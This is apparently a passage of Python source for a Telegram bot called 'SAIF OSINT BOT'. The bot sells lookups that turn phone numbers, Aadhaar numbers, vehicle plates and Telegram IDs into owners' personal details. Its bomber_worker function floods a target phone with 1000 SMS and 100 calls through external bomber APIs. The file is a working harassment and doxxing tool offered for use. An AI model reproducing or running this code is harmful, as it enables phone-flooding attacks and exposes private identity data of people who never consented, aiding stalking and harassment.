        'ask_aadhar': '🆔 12 अंकीय आधार नंबर भेजें:',
        'ask_vehicle': '🚗 वाहन नंबर भेजें (जैसे MH02FZ0555):',
        'ask_veh2num': '🚗 वाहन नंबर से डिटेल्स पाने के लिए भेजें:',
        'ask_tgid': '📱 Telegram User ID (संख्यात्मक) या @username भेजें:',
        'ask_ip': '🌐 IP address भेजें:',
        'ask_gst': '📊 GST नंबर (15 अक्षर) भेजें:',
        'ask_ifsc': '🏦 IFSC code भेजें:',
        'ask_bomber': '💣 10 अंकीय नंबर भेजें बॉम्बिंग के लिए:',
        'ask_upi': '💳 10 अंकीय नंबर भेजें UPI के लिए:',
        'err_num': '❌ मोबाइल नंबर 10 अंकों का होना चाहिए।',
        'err_aadhar': '❌ आधार 12 अंकों का होना चाहिए।',
        'err_vehicle': '❌ गलत वाहन नंबर फॉर्मेट!',
        'err_tgid': '❌ गलत Telegram User ID/Username!',
        'err_ip': '❌ गलत IP फॉर्मेट!',
        'err_gst': '❌ गलत GST फॉर्मेट!',
        'err_ifsc': '❌ गलत IFSC फॉर्मेट!',
        'no_history': '📭 कोई सर्च इतिहास नहीं मिला।',
        'history_cleared': '🗑️ इतिहास साफ कर दिया गया!',
        'no_tries': '❌ कोई सर्च बचा नहीं! 💡 कृपया प्रोमो कोड रिडीम करें या एडमिन से संपर्क करें।',
    }
}

def send_language_selection(chat_id):
    keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
    for code, lang in LANGUAGES.items():
        keyboard.add(telebot.types.InlineKeyboardButton(f"{lang['flag']} {lang['name']}", callback_data=f"lang_{code}"))
    bot.send_message(chat_id, TEXTS['en']['choose_lang'], reply_markup=keyboard)

def send_welcome_message(chat_id, user_id, lang='en'):
    text = TEXTS[lang]['welcome']
    emoji = get_random_emoji()
    bot.send_photo(chat_id, photo=WELCOME_PHOTO_URL, caption=f"{emoji} {text}", parse_mode='HTML')
    send_main_menu(chat_id, user_id, lang)

def send_main_menu(chat_id, user_id, lang='en'):
    keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add(telebot.types.KeyboardButton("👑 BOT OWNER"))
    keyboard.add(telebot.types.KeyboardButton("🎁 Redeem Promo Code"))
    keyboard.add(telebot.types.KeyboardButton("👤 My Account"))
    keyboard.add(telebot.types.KeyboardButton("📞 Num Info"))
    keyboard.add(telebot.types.KeyboardButton("🔍 Num Info Advance"))
    keyboard.add(telebot.types.KeyboardButton("🆔 Aadhar Info"))
    keyboard.add(telebot.types.KeyboardButton("🚗 Vehicle Info"))
    keyboard.add(telebot.types.KeyboardButton("🔗 Vehicle to Number"))
    keyboard.add(telebot.types.KeyboardButton("🆔 TG USERID TO NUM"))
    keyboard.add(telebot.types.KeyboardButton("💥 SMS + CALL BOMBER"))
    keyboard.add(telebot.types.KeyboardButton("💳 UPI ID Finder"))
    keyboard.add(telebot.types.KeyboardButton("🌐 IP Info"))
    keyboard.add(telebot.types.KeyboardButton("📊 GST Info"))
    keyboard.add(telebot.types.KeyboardButton("🏦 IFSC Info"))
    keyboard.add(telebot.types.KeyboardButton("📜 History"))
    keyboard.add(telebot.types.KeyboardButton("🗑️ Clear History"))
    if user_id == ADMIN_ID:
        keyboard.add(telebot.types.KeyboardButton("⚙️ Admin Panel"))
    bot.send_message(chat_id, f"{get_random_emoji()} Choose an option:", reply_markup=keyboard)

# ==================== BOMBER ====================
def bomber_worker(user_id, phone):
    session = bombing_sessions.get(user_id)
    if not session:
        return
    total_rounds = 100
    current_round = 0
    total_sent = 0
    total_calls = 0
    errors = 0
    http_session = requests.Session()
    try:
        bot.edit_message_text(
            f"💣 SMS + CALL Bombing started on {phone}!\n📦 Total rounds: {total_rounds}\n🎯 Target: 1000 SMS + 100 CALLS\n⏳ Round 0/{total_rounds} - Starting...",
            chat_id=user_id,
            message_id=session['msg_id'],
            reply_markup=session.get('stop_markup')
        )
    except:
        pass
    while session['active'] and current_round < total_rounds:
        try:
            current_round += 1
            sms_url = f"{BOMBER_API_URL}?key=demo1&number={phone}&counter=10"
            sms_resp = http_session.get(sms_url, timeout=10)
            if sms_resp.status_code == 200:
                total_sent += 10
            else:
                errors += 1
            call_url = f"{CALL_BOMBER_API_URL}?key=demo1&number={phone}"
            call_resp = http_session.get(call_url, timeout=10)
            if call_resp.status_code == 200:
                total_calls += 1
            else:
                errors += 1
            percentage = int((current_round/total_rounds)*100)
            try:
                bot.edit_message_text(
                    f"💣 SMS + CALL Bombing running...\n📱 {phone}\n📦 Round: {current_round}/{total_rounds}\n✅ SMS Sent: {total_sent}\n✅ CALL Sent: {total_calls}\n❌ Errors: {errors}\n📊 Progress: {percentage}%\n{'▓' * int(percentage/5)}{'░' * (20 - int(percentage/5))}\n🛑 Click Stop to end.",
                    chat_id=user_id,
                    message_id=session['msg_id'],
                    reply_markup=session.get('stop_markup')
                )
            except:
                pass
            time.sleep(1.5)
        except:
            errors += 1
            time.sleep(2)
    final_msg = f"🛑 Bombing Finished!\n📱 {phone}\n✅ SMS Sent: {total_sent}\n✅ CALL Sent: {total_calls}\n❌ Total errors: {errors}\n📦 Total rounds: {current_round}/{total_rounds}"
    if current_round >= total_rounds:
        final_msg += "\n✅ 1000 SMS + 100 CALLS sent successfully!"
    elif not session['active']:
        final_msg += "\n⏹️ Stopped by user."
    try:
        bot.edit_message_text(final_msg, chat_id=user_id, message_id=session['msg_id'])
    except:
        pass
    if user_id in bombing_sessions:
        del bombing_sessions[user_id]

def start_bomber_process(message, user_id, phone):
    if user_id in bombing_sessions:
        bot.reply_to(message, "⚠️ Already running!")
        return
    stop_markup = telebot.types.InlineKeyboardMarkup(row_width=1)
    stop_markup.add(telebot.types.InlineKeyboardButton("🛑 STOP BOMBER", callback_data="stop_bomber"))
    msg = bot.reply_to(message, f"💣 SMS + CALL Bomber started on {phone}!\n📦 100 rounds\n📨 10 SMS per round = 1000 SMS\n📞 1 CALL per round = 100 CALLS\n⏳ Estimated time: 2-3 minutes\n🛑 Click STOP to end bombing.", reply_markup=stop_markup)
    bombing_sessions[user_id] = {'active': True, 'msg_id': msg.message_id, 'stop_markup': stop_markup}
    threading.Thread(target=bomber_worker, args=(user_id, phone), daemon=True).start()

# ==================== SHOW FUNCTIONS ====================
def show_owner_details(chat_id, lang):
    emoji = get_random_emoji()
    bot.send_photo(chat_id, photo=OWNER_PHOTO_URL, caption=f"""
{emoji} <b>BOT OWNER</b>
👤 Username: @SAIFALI883883
👤 Owner: SAIF ALI ❤️‍🩹
📸 Instagram: <a href='{OWNER_INSTA}'>@nxt_level_saif</a>
📱 WhatsApp: <a href='{OWNER_WHATSAPP}'>Click here</a>
{get_footer()}
""", parse_mode='HTML')

def show_account_info(chat_id, user_id, lang):
    user = bot.get_chat(user_id)
    username = user.username or "No Username"
    tries = get_remaining_tries(user_id)
    emoji = get_random_emoji()
    bot.send_message(chat_id, f"""
{emoji} <b>MY ACCOUNT</b>
👤 Username: @{username}
🆔 User ID: <code>{user_id}</code>
🔍 Remaining: {tries} searches
{get_footer(user_id)}
""", parse_mode='HTML')

def show_history_by_user(user_id, chat_id, lang):
    history = user_history.get(user_id, [])
    if not history:
        bot.send_message(chat_id, TEXTS[lang]['no_history'], parse_mode='HTML')
        return
    recent = history[-10:]
    text = "📜 Last 10 searches:\n\n" + "\n".join([f"• {h}" for h in recent])
    bot.send_message(chat_id, text, parse_mode='HTML')

def clear_history_by_user(user_id, chat_id, lang):
    if user_id in user_history:
        user_history[user_id] = []
        bot.send_message(chat_id, TEXTS[lang]['history_cleared'], parse_mode='HTML')
    else:
        bot.send_message(chat_id, TEXTS[lang]['no_history'], parse_mode='HTML')

# ==================== ADMIN PANEL ====================
@bot.message_handler(func=lambda m: m.text == "⚙️ Admin Panel")
def admin_panel_handler(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ Only admin!")
        return
    keyboard = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    keyboard.add(telebot.types.KeyboardButton("📦 Generate Promo Code"))
    keyboard.add(telebot.types.KeyboardButton("🚫 Ban User"))
    keyboard.add(telebot.types.KeyboardButton("✅ Unban User"))
    keyboard.add(telebot.types.KeyboardButton("📢 Broadcast Message"))
    keyboard.add(telebot.types.KeyboardButton("🔙 Back to Menu"))
    bot.send_message(message.chat.id, "⚙️ ADMIN PANEL", reply_markup=keyboard)

@bot.message_handler(func=lambda m: m.text == "🔙 Back to Menu")
def back_to_menu(message):
    user_id = message.from_user.id
    send_main_menu(message.chat.id, user_id, get_lang(user_id))

@bot.message_handler(func=lambda m: m.text == "📦 Generate Promo Code")
def admin_gen_promo(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ Only admin!")
        return
    user_states[user_id] = "admin_gen_promo_step1"
    bot.reply_to(message, "❓ Kitne search ka code banana chahte ho?\n(e.g., 20)")

@bot.message_handler(func=lambda m: m.text == "🚫 Ban User")
def ban_user(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ Only admin!")
        return
    user_states[user_id] = "admin_ban_user"
    bot.reply_to(message, "🚫 Send User ID to ban:\n(e.g., 123456789)")

@bot.message_handler(func=lambda m: m.text == "✅ Unban User")
def unban_user(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ Only admin!")
        return
    user_states[user_id] = "admin_unban_user"
    bot.reply_to(message, "✅ Send User ID to unban:\n(e.g., 123456789)")

@bot.message_handler(func=lambda m: m.text == "📢 Broadcast Message")
def broadcast_msg(message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID:
        bot.reply_to(message, "❌ Only admin!")
        return
    user_states[user_id] = "admin_broadcast"
    bot.reply_to(message, "📢 Send message to broadcast to all users, channel & group:")

# ==================== MENU BUTTON HANDLERS ====================
@bot.message_handler(func=lambda m: m.text == "👑 BOT OWNER")
def owner_button(message):
    user_id = message.from_user.id
    lang = get_lang(user_id)
    show_owner_details(message.chat.id, lang)

@bot.message_handler(func=lambda m: m.text == "👤 My Account")
def account_button(message):
    user_id = message.from_user.id
    lang = get_lang(user_id)
    show_account_info(message.chat.id, user_id, lang)

@bot.message_handler(func=lambda m: m.text == "📜 History")
def history_button(message):
    user_id = message.from_user.id
    lang = get_lang(user_id)
    show_history_by_user(user_id, message.chat.id, lang)

@bot.message_handler(func=lambda m: m.text == "🗑️ Clear History")
def clear_button(message):
    user_id = message.from_user.id
    lang = get_lang(user_id)
    clear_history_by_user(user_id, message.chat.id, lang)

# ==================== COMMAND HANDLERS ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    register_user(user_id)

    if user_id == ADMIN_ID or user_id == PARTNER_ID:
        if user_id not in user_lang:
            send_language_selection(message.chat.id)
            return
        lang = get_lang(user_id)
        send_welcome_message(message.chat.id, user_id, lang)
        return

    if user_id in verified_users:
        is_member, _ = check_membership(user_id)
        if not is_member:
            verified_users.pop(user_id, None)
            save_verified_users()
        else:
            if user_id not in user_lang:
                send_language_selection(message.chat.id)
                return
            lang = get_lang(user_id)
            send_welcome_message(message.chat.id, user_id, lang)
            return

    keyboard = telebot.types.InlineKeyboardMarkup(row_width=1)
    keyboard.add(telebot.types.InlineKeyboardButton("📢 Join Channel", url=CHANNEL_LINK))
    keyboard.add(telebot.types.InlineKeyboardButton("👥 Join Group", url=GROUP_LINK))
    keyboard.add(telebot.types.InlineKeyboardButton("✅ Verify", callback_data="verify_me"))
    bot.send_message(
        message.chat.id,
        f"👋 Welcome to SAIF OSINT BOT, @{message.from_user.username or 'User'}!\n\n"
        "🔹 Please join our **Channel** and **Group** to get verified.\n"
        "🔹 After joining both, click **Verify** to start using the bot.\n\n"
        "🛡️ <b>POWERED BY @SAIFALI883883</b>",
        parse_mode='HTML',
        reply_markup=keyboard
    )

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = message.from_user.id
    lang = get_lang(user_id)
    bot.send_message(message.chat.id, TEXTS[lang]['help'], parse_mode='HTML')

@bot.message_handler(commands=['owner'])
def owner_command(message):
    user_id = message.from_user.id
    lang = get_lang(user_id)
    show_owner_details(message.chat.id, lang)

@bot.message_handler(commands=['account'])
def account_command(message):
    user_id = message.from_user.id
    lang = get_lang(user_id)
    show_account_info(message.chat.id, user_id, lang)

@bot.message_handler(commands=['history'])
def history_command(message):
    user_id = message.from_user.id
    lang = get_lang(user_id)
    show_history_by_user(user_id, message.chat.id, lang)

@bot.message_handler(commands=['clear'])
def clear_command(message):
    user_id = message.from_user.id
    lang = get_lang(user_id)
    clear_history_by_user(user_id, message.chat.id, lang)

# ==================== MAIN HANDLER ====================
@bot.message_handler(func=lambda m: True)
def handle_all(message):
    user_id = message.from_user.id
    text = message.text.strip()

    if user_id != ADMIN_ID and user_id != PARTNER_ID:
        if user_id in verified_users:
            is_member, _ = check_membership(user_id)
            if not is_member:
                verified_users.pop(user_id, None)
                save_verified_users()
                bot.reply_to(
                    message,
                    "🚫 You have left our **Channel** or **Group**! Please type /start to join and get verified again."
                )
                return
        else:
            bot.send_message(
                message.chat.id,
                "❌ You are not verified. Please type /start to get verified.",
                parse_mode='HTML'
            )
            return

    register_user(user_id)

    if is_user_banned(user_id) and user_id != ADMIN_ID and user_id != PARTNER_ID:
        bot.reply_to(message, "🚫 You are banned!")
        return

    lang = get_lang(user_id)
    state = user_states.get(user_id)

    # Admin States
    if user_id == ADMIN_ID:
        if state == "admin_gen_promo_step1":
            if text.isdigit():
                user_states[user_id] = "admin_gen_promo_step2"
                promo_data[user_id] = {'search_count': int(text)}
                bot.reply_to(message, f"❓ Kitne users ke liye?\nSearch: {text}")
            else:
                bot.reply_to(message, "❌ Send a number!")
            return
        if state == "admin_gen_promo_step2":
            if text.isdigit():
                search_count = promo_data.get(user_id, {}).get('search_count', 0)
                if search_count:
                    code = generate_promo_code()
                    save_promo_code(code, search_count, int(text), user_id)
                    bot.reply_to(message, f"🎁 Code: <code>{code}</code>\n🔍 {search_count} searches\n👥 {text} users max\n\n{get_footer()}", parse_mode='HTML')
                    user_states[user_id] = None
                    promo_data.pop(user_id, None)
                else:
                    bot.reply_to(message, "❌ Session expired!")
            else:
                bot.reply_to(message, "❌ Send a number!")
            return
        if state == "admin_ban_user":
            if text.isdigit():
                c = conn.cursor()
                c.execute("UPDATE users SET banned = 1 WHERE user_id = ?", (int(text),))
                conn.commit()
                c.close()
                bot.reply_to(message, f"✅ User {text} banned!")
                user_states[user_id] = None
            else:
                bot.reply_to(message, "❌ Send numeric ID!")
            return
        if state == "admin_unban_user":
            if text.isdigit():
                c = conn.cursor()
                c.execute("UPDATE users SET banned = 0 WHERE user_id = ?", (int(text),))
                conn.commit()
                c.close()
                bot.reply_to(message, f"✅ User {text} unbanned!")
                user_states[user_id] = None
            else:
                bot.reply_to(message, "❌ Send numeric ID!")
            return
        if state == "admin_broadcast":
            c = conn.cursor()
            c.execute("SELECT user_id FROM users")
            users = c.fetchall()
            c.close()
            sent = 0
            failed = 0
            for u in users:
                try:
                    bot.send_message(u[0], f"📢 <b>BROADCAST</b>\n\n{text}\n\n{get_footer()}", parse_mode='HTML')
                    sent += 1
                except:
                    failed += 1
                time.sleep(0.1)
            try:
                bot.send_message(CHANNEL_ID, f"📢 <b>BROADCAST</b>\n\n{text}\n\n{get_footer()}", parse_mode='HTML')
                channel_status = "✅ Sent to channel"
            except Exception as e:
                channel_status = f"❌ Channel error: {e}"
            try:
                bot.send_message(GROUP_ID, f"📢 <b>BROADCAST</b>\n\n{text}\n\n{get_footer()}", parse_mode='HTML')
                group_status = "✅ Sent to group"
            except Exception as e:
                group_status = f"❌ Group error: {e}"
            bot.reply_to(message, f"✅ <b>Broadcast Complete!</b>\n\n👥 Users: {sent} sent, {failed} failed\n📢 Channel: {channel_status}\n👥 Group: {group_status}\n\n{get_footer()}", parse_mode='HTML')
            user_states[user_id] = None
            return

    # Menu Actions
    menu_map = {
        "BOT OWNER": "owner", "My Account": "my_account",
        "Num Info": "waiting_num", "Num Info Advance": "waiting_num_advance",
        "Aadhar Info": "waiting_aadhar", "Vehicle Info": "waiting_vehicle",
        "Vehicle to Number": "waiting_veh2num", "TG USERID TO NUM": "waiting_tgid",
        "SMS + CALL BOMBER": "waiting_bomber", "UPI ID Finder": "waiting_upi",
        "IP Info": "waiting_ip", "GST Info": "waiting_gst",
        "IFSC Info": "waiting_ifsc", "History": "history",
        "Clear History": "clear_history", "Redeem Promo Code": "promo_code",
    }
    clean_text = strip_emoji(text)
    if clean_text in menu_map:
        user_states[user_id] = None
        action = menu_map[clean_text]
        if action == "owner": show_owner_details(message.chat.id, lang)
        elif action == "my_account": show_account_info(message.chat.id, user_id, lang)
        elif action == "history": show_history_by_user(user_id, message.chat.id, lang)
        elif action == "clear_history": clear_history_by_user(user_id, message.chat.id, lang)
        elif action == "promo_code":
            if is_user_banned(user_id):
                bot.reply_to(message, "🚫 You are banned!")
                return
            user_states[user_id] = "waiting_promo_code"
            bot.reply_to(message, "🎁 Send promo code:\nFormat: any valid code (e.g., SAIFALI1234)")
        else:
            user_states[user_id] = action
            ask_key = action.replace("waiting_", "ask_")
            bot.send_message(message.chat.id, TEXTS[lang][ask_key])
        return

    if state == "waiting_promo_code":
        code = text.strip().upper()
        result = redeem_promo_code(code, user_id)
        if result is None:
            bot.reply_to(message, "❌ Invalid or expired code!\nContact @SAIFALI883883")
        elif result == -1:
            bot.reply_to(message, "⚠️ Already used this code!")
        else:
            remaining = get_remaining_tries(user_id)
            bot.reply_to(message, f"✅ +{result} searches added!\n📊 Balance: {remaining}\n\n{get_footer(user_id)}", parse_mode='HTML')
        user_states[user_id] = None
        return

    if user_id != ADMIN_ID and user_id != PARTNER_ID:
        if not can_search(user_id) and state not in ['waiting_bomber']:
            remaining = get_remaining_tries(user_id)
            bot.reply_to(message, f"❌ No searches left! (Remaining: {remaining})\n💡 {TEXTS[lang]['no_tries']}\n\n{get_footer(user_id)}", parse_mode='HTML')
            return

    # ==================== STATE HANDLERS ====================
    if state == "waiting_num":
        if text.isdigit() and len(text) == 10:
            loading_msg = bot.reply_to(message, "⏳ Processing...")
            try:
                resp = requests.get(PHONE_URL, params={'number': text, 'key': PHONE_KEY}, timeout=30)
                data = resp.json()
                result_text = format_phone(data)
                save_to_history(user_id, "Num", text)
                if user_id != ADMIN_ID and user_id != PARTNER_ID:
                    use_try(user_id)
                send_result_with_buttons(message.chat.id, loading_msg, result_text, data, user_id)
            except Exception as e:
                safe_delete_message(message.chat.id, loading_msg.message_id)
                bot.reply_to(message, f"❌ Error: {e}")
            user_states[user_id] = None
        else:
            bot.reply_to(message, TEXTS[lang]['err_num'])
        return

    if state == "waiting_num_advance":
        if text.isdigit() and len(text) == 10:
            loading_msg = bot.reply_to(message, "⏳ Fetching large data...")
            try:
                resp = requests.get(f"{NUM_ADVANCE_URL}?key={NUM_ADVANCE_KEY}&num={text}")
                data = resp.json()
                if data and (data.get('success') or data.get('chain')):
                    result_text = format_num_advance(data)
                    save_to_history(user_id, "Num Advance", text)
                    if user_id != ADMIN_ID and user_id != PARTNER_ID:
                        use_try(user_id)
                    send_result_with_buttons(message.chat.id, loading_msg, result_text, data, user_id)
                else:
                    safe_delete_message(message.chat.id, loading_msg.message_id)
                    bot.reply_to(message, "❌ No data found.")
            except Exception as e:
                safe_delete_message(message.chat.id, loading_msg.message_id)
                bot.reply_to(message, f"❌ Error: {e}")
            user_states[user_id] = None
        else:
            bot.reply_to(message, TEXTS[lang]['err_num'])
        return

    if state == "waiting_aadhar":
        if text.isdigit() and len(text) == 12:
            loading_msg = bot.reply_to(message, "⏳ Processing...")
            try:
                resp = requests.get(AADHAR_URL, params={'number': text, 'key': AADHAR_KEY}, timeout=30)
                data = resp.json()
                result_text = format_aadhar(data)
                save_to_history(user_id, "Aadhar", text)
                if user_id != ADMIN_ID and user_id != PARTNER_ID:
                    use_try(user_id)
                send_result_with_buttons(message.chat.id, loading_msg, result_text, data, user_id)
            except Exception as e:
                safe_delete_message(message.chat.id, loading_msg.message_id)
                bot.reply_to(message, f"❌ Error: {e}")
            user_states[user_id] = None
        else:
            bot.reply_to(message, TEXTS[lang]['err_aadhar'])
        return

    if state == "waiting_vehicle":
        text_upper = text.upper().strip()
        if len(text_upper) >= 6:
            loading_msg = bot.reply_to(message, "⏳ Fetching vehicle data...")
            result_text = None
            raw_data = {}
            primary_valid = False
            try:
                resp = requests.get(f"{VEHICLE_INFO_URL}?num={text_upper}")
                if resp.status_code == 200:
                    data = resp.json()
                    car = data.get('api_1_car_info', {})
                    ummym = data.get('api_2_ummym', {}).get('data', {})
                    if (car.get('registration', {}).get('rto') or car.get('owner', {}).get('name') or ummym.get('owner_name')):
                        raw_data = data
                        result_text = format_vehicle_info(data)
                        primary_valid = True
            except: pass
            if not primary_valid:
                try:
                    resp_backup = requests.get(f"https://reseller-host.vercel.app/api/rc?number={text_upper}")
                    if resp_backup.status_code == 200:
                        backup_data = resp_backup.json()
                        if backup_data and backup_data.get('rc_number') and backup_data.get('owner_name'):
                            raw_data = backup_data
                            result_text = format_vehicle_info_backup(backup_data)
                            primary_valid = True
                except: pass
            if result_text:
                save_to_history(user_id, "Vehicle", text_upper)
                if user_id != ADMIN_ID and user_id != PARTNER_ID:
                    use_try(user_id)
                send_result_with_buttons(message.chat.id, loading_msg, result_text, raw_data, user_id)
            else:
                safe_delete_message(message.chat.id, loading_msg.message_id)
                bot.reply_to(message, "❌ No vehicle data found.")
            user_states[user_id] = None
        else:
            bot.reply_to(message, TEXTS[lang]['err_vehicle'])
        return

    if state == "waiting_veh2num":
        text_upper = text.upper().strip()
        if len(text_upper) >= 6:
            loading_msg = bot.reply_to(message, "⏳ Processing...")
            try:
                resp = requests.get(f"{VEHICLE_TO_NUM_URL}?key={VEHICLE_TO_NUM_KEY}&vehicle={text_upper}")
                data = resp.json()
                result_text = format_vehicle_to_number(data)
                save_to_history(user_id, "Veh2Num", text_upper)
                if user_id != ADMIN_ID and user_id != PARTNER_ID:
                    use_try(user_id)
                send_result_with_buttons(message.chat.id, loading_msg, result_text, data, user_id)
            except Exception as e:
                safe_delete_message(message.chat.id, loading_msg.message_id)
                bot.reply_to(message, f"❌ Error: {e}")
            user_states[user_id] = None
        else:
            bot.reply_to(message, TEXTS[lang]['err_vehicle'])
        return

    if state == "waiting_tgid":
        loading_msg = bot.reply_to(message, "⏳ Processing...")
        target_id = None
        display_input = text
        
        if text.isdigit():
            target_id = text
            display_input = f"User ID: {text}"
        else:
            resolved_id = resolve_username_sync(text)
            if resolved_id:
                target_id = resolved_id
                clean_username = text
                if not clean_username.startswith('@'):
                    clean_username = '@' + clean_username
                display_input = f"Username: {clean_username}"
            else:
                bot.edit_message_text(
                    f"❌ Username `{text}` not found or invalid.\n\n"
                    f"💡 Make sure the username is public.\n"
                    f"🔄 Alternatively, send the numeric User ID directly.",
                    chat_id=message.chat.id,
                    message_id=loading_msg.message_id,
                    parse_mode='HTML'
                )
                user_states[user_id] = None
                return
        
        if target_id:
            try:
                params = {'key': TG_USERID_TO_NUM_KEY, 'q': target_id}
                resp = requests.get(TG_USERID_TO_NUM_URL, params=params, timeout=30)
                data = resp.json()
                
                if data.get('status'):
                    records = data.get('data', {}).get('source1', {}).get('records', [])
                    if records:
                        r = records[0]
                        result_text = (
                            f"🔍 **Searched:** {display_input}\n\n"
                            f"🆔 **Target ID:** {data.get('target_id', 'N/A')}\n"
                            f"📱 **Phone:** {r.get('phone', 'N/A')}\n"
                            f"🌍 **Country:** {r.get('country', 'N/A')}\n"
                            f"🔢 **Code:** {r.get('country_code', 'N/A')}"
                        )
                        save_to_history(user_id, "TGID", text)
                        if user_id != ADMIN_ID and user_id != PARTNER_ID:
                            use_try(user_id)
                        safe_delete_message(message.chat.id, loading_msg.message_id)
                        send_result_with_buttons(message.chat.id, loading_msg, result_text, data, user_id)
                    else:
                        bot.edit_message_text("❌ No records found.", chat_id=message.chat.id, message_id=loading_msg.message_id)
                else:
                    bot.edit_message_text("❌ No data found.", chat_id=message.chat.id, message_id=loading_msg.message_id)
            except Exception as e:
                bot.edit_message_text(f"❌ Error: {e}", chat_id=message.chat.id, message_id=loading_msg.message_id)
        user_states[user_id] = None
        return

    if state == "waiting_bomber":
        if text.isdigit() and len(text) == 10:
            start_bomber_process(message, user_id, text)
            user_states[user_id] = None
        else:
            bot.reply_to(message, TEXTS[lang]['err_num'])
        return

    if state == "waiting_upi":
        if text.isdigit() and len(text) == 10:
            loading_msg = bot.reply_to(message, "⏳ Fetching UPI details...")
            try:
                demo_data = [{"upi_id": f"{text}@paytm", "name": "Demo User", "app": "Paytm", "status": "Active"}]
                result_text = format_upi(text, demo_data)
                save_to_history(user_id, "UPI", text)
                if user_id != ADMIN_ID and user_id != PARTNER_ID:
                    use_try(user_id)
                send_result_with_buttons(message.chat.id, loading_msg, result_text, {"demo": True}, user_id)
            except Exception as e:
                safe_delete_message(message.chat.id, loading_msg.message_id)
                bot.reply_to(message, f"❌ Error: {e}")
            user_states[user_id] = None
        else:
            bot.reply_to(message, TEXTS[lang]['err_num'])
        return

    if state == "waiting_ip":
        if len(text.split('.')) == 4 or ':' in text:
            loading_msg = bot.reply_to(message, "⏳ Fetching IP info...")
            try:
                resp = requests.get(f"{IP_INFO_URL}?ip={text}")
                data = resp.json()
                result_text = format_ip(data)
                save_to_history(user_id, "IP", text)
                if user_id != ADMIN_ID and user_id != PARTNER_ID:
                    use_try(user_id)
                send_result_with_buttons(message.chat.id, loading_msg, result_text, data, user_id)
            except Exception as e:
                safe_delete_message(message.chat.id, loading_msg.message_id)
                bot.reply_to(message, f"❌ Error: {e}")
            user_states[user_id] = None
        else:
            bot.reply_to(message, TEXTS[lang]['err_ip'])
        return

    if state == "waiting_gst":
        if len(text) == 15:
            loading_msg = bot.reply_to(message, "⏳ Fetching GST info...")
            try:
                resp = requests.get(f"{GST_INFO_URL}?gstin={text}")
                data = resp.json()
                result_text = format_gst(data)
                save_to_history(user_id, "GST", text)
                if user_id != ADMIN_ID and user_id != PARTNER_ID:
                    use_try(user_id)
                send_result_with_buttons(message.chat.id, loading_msg, result_text, data, user_id)
            except Exception as e:
                safe_delete_message(message.chat.id, loading_msg.message_id)
                bot.reply_to(message, f"❌ Error: {e}")
            user_states[user_id] = None
        else:
            bot.reply_to(message, TEXTS[lang]['err_gst'])
        return

    if state == "waiting_ifsc":
        if len(text) >= 4:
            loading_msg = bot.reply_to(message, "⏳ Fetching IFSC info...")
            try:
                resp = requests.get(f"{IFSC_INFO_URL}{text}")
                data = resp.json()
                if data and not data.get('error'):
                    result_text = format_ifsc(data)
                    save_to_history(user_id, "IFSC", text)
                    if user_id != ADMIN_ID and user_id != PARTNER_ID:
                        use_try(user_id)
                    send_result_with_buttons(message.chat.id, loading_msg, result_text, data, user_id)
                else:
                    safe_delete_message(message.chat.id, loading_msg.message_id)
                    bot.reply_to(message, "❌ No data found.")
            except Exception as e:
                safe_delete_message(message.chat.id, loading_msg.message_id)
                bot.reply_to(message, f"❌ Error: {e}")
            user_states[user_id] = None
        else:
            bot.reply_to(message, TEXTS[lang]['err_ifsc'])
        return

    if not text.startswith('/'):
        bot.reply_to(message, "❌ Unknown command! Type /help to see all commands.")

# ==================== MAIN ====================
if __name__ == '__main__':
    print("🔥 SAIF OSINT BOT STARTED!")
    print("👤 Admin: @SAIFALI883883")
    print("🤖 Bot is running...")

    main_loop = asyncio.new_event_loop()
    asyncio.set_event_loop(main_loop)
    telethon_thread = threading.Thread(target=main_loop.run_forever, daemon=True)
    telethon_thread.start()

    async def init_client():
        await client.start()
        print("✅ Telethon (User Client) Started Successfully!")

    try:
        future = asyncio.run_coroutine_threadsafe(init_client(), main_loop)
        future.result(timeout=30)
    except Exception as e:
        print(f"⚠️ Telethon Error: {e} (Make sure session_name.session is uploaded)")

    while True:
        try:
            bot.infinity_polling(timeout=30)
        except Exception as e:
            print(f"⚠️ Error: {e}")
            time.sleep(5)
